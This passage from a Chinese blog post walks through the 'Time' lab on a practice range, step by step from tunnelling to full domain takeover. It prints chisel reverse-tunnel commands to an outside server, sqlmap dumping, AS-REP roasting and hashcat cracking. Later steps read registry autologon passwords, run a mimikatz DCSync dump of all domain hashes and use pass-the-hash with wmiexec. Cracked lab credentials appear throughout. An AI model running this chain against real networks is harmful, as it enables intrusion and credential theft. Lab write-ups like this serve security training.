+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 开始漏洞扫描
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 加载的插件: findnet, ldap, ms17010, neo4j, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果
+目标主机: <span class="token number">172.22</span>.6.12
+主机名: DC-PROGAME
+发现的网络接口:
+   IPv4地址:
+      └─ <span class="token number">172.22</span>.6.12
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 http://172.22.6.38        状态码:200 长度:1531   标题:后台登录
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> 系统信息 <span class="token number">172.22</span>.6.12 <span class="token punctuation">[</span>Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span><span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.6.25     XIAORANG<span class="token punctuation">\</span>WIN2019              
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.6.12     DC:DC-PROGAME.xiaorang.lab       Windows Server <span class="token number">2016</span> Datacenter <span class="token number">14393</span>
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> NetInfo 扫描结果
+目标主机: <span class="token number">172.22</span>.6.25
+主机名: WIN2019
+发现的网络接口:
+   IPv4地址:
+      └─ <span class="token number">172.22</span>.6.25
+<span class="token punctuation">[</span><span class="token number">2025</span>-02-25 09:20:19<span class="token punctuation">]</span> <span class="token punctuation">[</span>SUCCESS<span class="token punctuation">]</span> 网站标题 https://172.22.6.36:7687  状态码:400 长度:50     标题:无标题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>整理一下</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.22.6.12 DC-PROGAME
+172.22.6.25 WIN2019
+172.22.6.36 Neo4j
+172.22.6.38 Linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>起代理</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">33322</span> <span class="token parameter variable">--reverse</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel client vpsip:33322 R:0.0.0.0:44543:socks<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h1 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h1><p>先看 172.22.6.38 这个网站后台</p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225092910914.png" alt="image-20250225092910914"></p>
+<p>bp 配置 socks 代理抓包测试</p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225093031631.png" alt="image-20250225093031631"></p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/index.php</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">172.22.6.38</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">68</span></span>
+<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://172.22.6.38</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://172.22.6.38/</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">Priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span>
+
+username=admin&amp;password=123456<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接sqlmap一把梭试试，把上面这个http请求包保存为1.txt</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> sqlmap <span class="token parameter variable">-r</span> <span class="token number">1</span>.txt <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225094046157.png" alt="image-20250225094046157"></p>
+<p>拿到第二个flag</p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225093921074.png" alt="image-20250225093921074"></p>
+<p>还有 oa 的 admin 账密和一堆疑似是域用户名的数据</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">+----+------------------+---------------+
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> password         <span class="token operator">|</span> username      <span class="token operator">|</span>
++----+------------------+---------------+
+<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> bo2y8kAL3HnXUiQo <span class="token operator">|</span> administrator <span class="token operator">|</span>
++----+------------------+---------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>因为之前提示了 Kerberos 认证相关，先写个脚本把用户名提取出来保存为user.txt</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
+
+<span class="token comment"># 打开原始数据文件</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/root/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 提取指定字符串</span>
+users <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> line <span class="token keyword">in</span> data<span class="token punctuation">:</span>
+    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'(\w+)@xiaorang.lab'</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>
+        username <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        users<span class="token punctuation">.</span>append<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+
+<span class="token comment"># 保存提取后的字符串到 user.txt</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'user.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>
+        <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>user <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后用 impacket 的 GetNPUsers 枚举未设置预认证的账号，打 AS-REP Roasting（这个东西默认是不关闭的，但当关闭了预身份验证后，攻击者可以使用指定用户向域控制器的Kerberos  88端口请求票据，此时域控不会进行任何验证就将TGT和该用户Hash加密的Login Session Key  返回。因此，攻击者就可以对获取到的用户Hash加密的 Login Session Key  进行离线破解，如果字典够强大，则可能破解得到该指定用户的明文密码）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 GetNPUsers.py -dc-ip <span class="token number">172.22</span>.6.12 <span class="token parameter variable">-usersfile</span> /tools/user.txt xiaorang.lab/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225100249181.png" alt="image-20250225100249181"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$wenshao</span>@XIAORANG.LAB:d19174e7aae7ac542312c3b63112d18e<span class="token variable">$3f7b1abe75b15fc561d0c74e8a1e906ee0a615f51dccb9dcc6e0729e8759f9210b00c9ff53e9c7b4b0b62b4e3fadaecaa3a74ec3ae010f17003979cc4ca68190721646226c26edc98dc6de2f462b1752f7bf0d8f4e9b6261c5b214746fbc7b051f851213c2c10c655df3ca68ca3e784bf9e61fade9fffbf8b23a54e033b0d91bf2f613a8614926badd8172987c39bfa415a532b6402fc12354132b4ec6611a6737ffc737ba116621f65a8a97956bb76222a6f31f4bc5778f157622ee36a695f78ff933714fd2f3830559fdc2513035981ca667a0fe9a7ae5404ff2b98344a454bd6f5b0a4336da32819b8920</span>
+
+<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$zhangxin</span>@XIAORANG.LAB:d793cda385d3c71b78e2b58d687e5635<span class="token variable">$52b5edc499f1e93bc023f54039fab7b645ee90bbd72e1f8df31c93bd8a50b008396f2fb99c8ae325eaf7452a4f5073a8bc6ad70d73f598a0b8603677013e48e0f9adba9ffeb7b2b410709817f091f21677e3cdb48df01da8e351d2011a0adaa85dc4af7d85229a586a2ef6e7c75b02d2e32e5694157faf7a41f55c9b09849d240e3b1ea33e9d5cb74415ccd3d082f9ab560b148da108e5c6902ae044afc17c99306c6d4926f765474a92d69254fa9a927ba05075d9f5a3b40b20d72a709d1c0ac436e8bef62796b75b0d210c3859957656e25d4cd37ba8b93442d28bfc9f90007029d10e3756737dbe8140b1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>拿到两组用户凭据</p>
+<p>hashcat 跑 rockyou（kali 2g内存不够用，得上4g才能爆）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">18200</span> hash.txt <span class="token parameter variable">-a</span> <span class="token number">0</span> /usr/share/wordlists/rockyou.txt <span class="token parameter variable">--force</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225102059158.png" alt="image-20250225102059158"></p>
+<p>成功爆出密码</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">wenshao:hellokitty
+zhangxin:strawberry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>然后用 crackmapexec 跑 rdp</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> crackmapexec rdp <span class="token number">172.22</span>.6.0/24 <span class="token parameter variable">-u</span> wenshao <span class="token parameter variable">-p</span> hellokitty <span class="token parameter variable">-d</span> xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但是我的python依赖版本不对还更新不上导致跑不起来，换windows了</p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225144849203.png" alt="image-20250225144849203"></p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225145027844.png" alt="image-20250225145027844"></p>
+<p>于是登录 172.22.6.25，注意账户名要带上前面的域 xiaorang.lab\wenshao</p>
+<p>查看下用户</p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225145454001.png" alt="image-20250225145454001"></p>
+<p>疑似开了Windows自动登录，所以可以抓密码</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg query <span class="token string">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225145923756.png" alt="image-20250225145923756"></p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">DefaultUserName    REG_SZ    yuxuan
+DefaultPassword    REG_SZ    Yuxuan7QbrgZ3L
+DefaultDomainName    REG_SZ    xiaorang<span class="token punctuation">.</span>lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>换 xiaorang.lab\yuxuan 这个账号登了一下，用 BloodHound 分析域内关系，参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6907">https://xz.aliyun.com/news/6907</a></p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225153825715.png" alt="image-20250225153825715"></p>
+<p>把解压的json导入即可看到域内关系</p>
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225154227590.png" alt="image-20250225154227590"></p>
+<h1 id="SID历史功能滥用"><a href="#SID历史功能滥用" class="headerlink" title="SID历史功能滥用"></a>SID历史功能滥用</h1><p>可以看到这个用户滥用了SID历史功能</p>
+<blockquote>
+<p>SIDHistory 是一个为支持域迁移方案而设置的属性，当一个对象从一个域迁移到另一个域时，会在新域创建一个新的 SID 作为该对象的 objectSid，在之前域中的 SID 会添加到该对象的 sIDHistory 属性中，此时该对象将保留在原来域的 SID 对应的访问权限</p>
+</blockquote>
+<p>先上猕猴桃抓一下</p>
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"lsadump::dcsync /domain:xiaorang.lab /all /csv"</span> <span class="token string">"exit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># lsadump::dcsync /domain:xiaorang.lab /all /csv</span>
+<span class="token namespace">[DC]</span> <span class="token string">'xiaorang.lab'</span> will be the domain
+<span class="token namespace">[DC]</span> <span class="token string">'DC-PROGAME.xiaorang.lab'</span> will be the DC server
+<span class="token namespace">[DC]</span> Exporting domain <span class="token string">'xiaorang.lab'</span>
+<span class="token namespace">[rpc]</span> Service  : ldap
+<span class="token namespace">[rpc]</span> AuthnSvc : GSS_NEGOTIATE <span class="token punctuation">(</span>9<span class="token punctuation">)</span>
+1103    shuzhen 07c1f387d7c2cf37e0ca7827393d2327        512
+1104    gaiyong 52c909941c823dbe0f635b3711234d2e        512
+1106    xiqidi  a55d27cfa25f3df92ad558c304292f2e        512
+1107    wengbang        6b1d97a5a68c6c6c9233d11274d13a2e        512
+1108    xuanjiang       a72a28c1a29ddf6509b8eabc61117c6c        512
+1109    yuanchang       e1cea038f5c9ffd9dc323daf35f6843b        512
+1110    lvhui   f58b31ef5da3fc831b4060552285ca54        512
+1111    wenbo   9abb7115997ea03785e92542f684bdde        512
+1112    zhenjun 94c84ba39c3ece24b419ab39fdd3de1a        512
+1113    jinqing 4bf6ad7a2e9580bc8f19323f96749b3a        512
+1115    yangju  1fa8c6b4307149415f5a1baffebe61cf        512
+1117    weicheng        796a774eace67c159a65d6b86fea1d01        512
+1118    weixian 8bd7dc83d84b3128bfbaf165bf292990        512
+1119    haobei  045cc095cc91ba703c46aa9f9ce93df1        512
+1120    jizhen  1840c5130e290816b55b4e5b60df10da        512
+1121    jingze  3c8acaecc72f63a4be945ec6f4d6eeee        512
+1122    rubao   d8bd6484a344214d7e0cfee0fa76df74        512
+1123    zhaoxiu 694c5c0ec86269daefff4dd611305fab        512
+1124    tangshun        90b8d8b2146db6456d92a4a133eae225        512
+1125    liangliang      c67cd4bae75b82738e155df9dedab7c1        512
+1126    qiyue   b723d29e23f00c42d97dd97cc6b04bc8        512
+1127    chouqian        c6f0585b35de1862f324bc33c920328d        512
+1128    jicheng 159ee55f1626f393de119946663a633c        512
+1129    xiyi    ee146df96b366efaeb5138832a75603b        512
+1130    beijin  a587b90ce9b675c9acf28826106d1d1d        512
+1131    chenghui        08224236f9ddd68a51a794482b0e58b5        512
+1132    chebin  b50adfe07d0cef27ddabd4276b3c3168        512
+1133    pengyuan        a35d8f3c986ab37496896cbaa6cdfe3e        512
+1134    yanglang        91c5550806405ee4d6f4521ba6e38f22        512
+1135    jihuan  cbe4d79f6264b71a48946c3fa94443f5        512
+1136    duanmuxiao      494cc0e2e20d934647b2395d0a102fb0        512
+1137    hongzhi f815bf5a1a17878b1438773dba555b8b        512
+1138    gaijin  b1040198d43631279a63b7fbc4c403af        512
+1139    yifu    4836347be16e6af2cd746d3f934bb55a        512
+1140    fusong  adca7ec7f6ab1d2c60eb60f7dca81be7        512
+1141    luwan   c5b2b25ab76401f554f7e1e98d277a6a        512
+1142    tangrong        2a38158c55abe6f6fe4b447fbc1a3e74        512
+1143    zhufeng 71e03af8648921a3487a56e4bb8b5f53        512
+1145    dongcheng       f2fdf39c9ff94e24cf185a00bf0a186d        512
+1146    lianhuangchen   23dc8b3e465c94577aa8a11a83c001af        512
+1147    lili    b290a36500f7e39beee8a29851a9f8d5        512
+1148    huabi   02fe5838de111f9920e5e3bb7e009f2f        512
+1149    rangsibo        103d0f70dc056939e431f9d2f604683c        512
+1150    wohua   cfcc49ec89dd76ba87019ca26e5f7a50        512
+1151    haoguang        33efa30e6b3261d30a71ce397c779fda        512
+1152    langying        52a8a125cd369ab16a385f3fcadc757d        512
+1153    diaocai a14954d5307d74cd75089514ccca097a        512
+1154    lianggui        4ae2996c7c15449689280dfaec6f2c37        512
+1155    manxue  0255c42d9f960475f5ad03e0fee88589        512
+1156    baqin   327f2a711e582db21d9dd6d08f7bdf91        512
+1157    chengqiu        0d0c1421edf07323c1eb4f5665b5cb6d        512
+1158    louyou  a97ba112b411a3bfe140c941528a4648        512
+1159    maqun   485c35105375e0754a852cee996ed33b        512
+1160    wenbiao 36b6c466ea34b2c70500e0bfb98e68bc        512
+1161    weishengshan    f60a4233d03a2b03a7f0ae619c732fae        512
+1163    chuyuan 0cfdca5c210c918b11e96661de82948a        512
+1164    wenliang        a4d2bacaf220292d5fdf9e89b3513a5c        512
+1165    yulvxue cf970dea0689db62a43b272e2c99dccd        512
+1166    luyue   274d823e941fc51f84ea323e22d5a8c4        512
+1167    ganjian 7d3c39d94a272c6e1e2ffca927925ecc        512
+1168    pangzhen        51d37e14983a43a6a45add0ae8939609        512
+1169    guohong d3ce91810c1f004c782fe77c90f9deb6        512
+1170    lezhong dad3990f640ccec92cf99f3b7be092c7        512
+1171    sheweiyue       d17aecec7aa3a6f4a1e8d8b7c2163b35        512
+1172    dujian  8f7846c78f03bf55685a697fe20b0857        512
+1173    lidongjin       34638b8589d235dea49e2153ae89f2a1        512
+1174    hongqun 6c791ef38d72505baeb4a391de05b6e1        512
+1175    yexing  34842d36248c2492a5c9a1ae5d850d54        512
+1176    maoda   6e65c0796f05c0118fbaa8d9f1309026        512
+1177    qiaomei 6a889f350a0ebc15cf9306687da3fd34        512
+502     krbtgt  a4206b127773884e2c7ea86cdd282d9c        514
+500     Administrator   04d93ffd6f5f6e4490e0de23f240a5e9        512
+1000    DC-PROGAME$     25ac4f988a525288ff2d112d3e7e2954        532480
+1178    wenshao b31c6aa5660d6e87ee046b1bb5d0ff79        4260352
+1179    zhangxin        d6c5976e07cdb410be19b84126367e3d        4260352
+1181    WIN2019$        79c15f63810988cec86ec6e70ecd3305        4096
+1180    yuxuan  376ece347142d1628632d440530e8eed        66048
+
+mimikatz<span class="token punctuation">(</span>commandline<span class="token punctuation">)</span> <span class="token comment"># exit</span>
+Bye!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>直接把域管理员 Administrator 哈希dump了，所以相当于已经拿下域控了</p>
+<p>哈希传递登一下其他两台机器拿一下flag就结束了</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 wmiexec.py <span class="token parameter variable">-hashes</span> :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.25 <span class="token parameter variable">-codec</span> gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225152158556.png" alt="image-20250225152158556"></p>
+<p>看提示感觉预期解是本地先提权再dump hash？</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python3 wmiexec.py <span class="token parameter variable">-hashes</span> :04d93ffd6f5f6e4490e0de23f240a5e9 xiaorang.lab/administrator@172.22.6.12 <span class="token parameter variable">-codec</span> gbk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2025/02/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Time/image-20250225152333404.png" alt="image-20250225152333404"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            </div>
+        </transition>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/blog/js/main.js"></script>
+    
+    
+
+
+
+
+    
+    
+
+<div id="vcomments"></div>
+
+<script src="/blog/js/lib/valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
+        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
+        visitor: 'true',
+        placeholder: '写点什么吧(●ˇ∀ˇ●)',
+        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
+    });
+</script>
+
+    <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 雲流のLowest World
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;C1oudfL0w0
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
